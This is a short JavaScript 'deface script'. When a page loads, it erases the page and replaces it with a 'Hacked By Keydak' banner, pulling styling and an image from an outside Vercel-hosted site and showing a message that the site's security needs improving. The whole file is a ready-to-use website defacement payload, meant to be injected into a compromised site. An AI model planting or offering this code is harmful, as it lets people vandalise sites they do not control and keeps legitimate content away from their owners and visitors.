// Deface script
document.addEventListener('DOMContentLoaded', function () {

    document.documentElement.innerHTML = '';


    var newHtmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Home - Hacked By Keydak</title>
            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
        </head>
        <body>
            <div class="mainContainer">
                <div class="img">
                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
                </div>
                <h1> Hacked By Keydak</h1>
                <hr class="hr">
                <div class="container">
                    <p class="text1">you need to improve the security system on your site</p>
                </div>
            </div>
        </body>
        
        </html>
    `;


    document.addEventListener('DOMContentLoaded', function() {
        var text = "you need to improve the security system on your site";
        var textElement = document.querySelector('.text1');
        var index = 0;

        function type() {
            if (index < text.length) {
                textElement.textContent += text.charAt(index);
                index++;
                setTimeout(type, 150);
            } else {
                setTimeout(() => {
                    textElement.textContent = '';
                    index = 0;
                    type();
                }, 1000); // Pause before restarting
            }
        }

        type();
    });
    document.documentElement.innerHTML = newHtmlContent;
});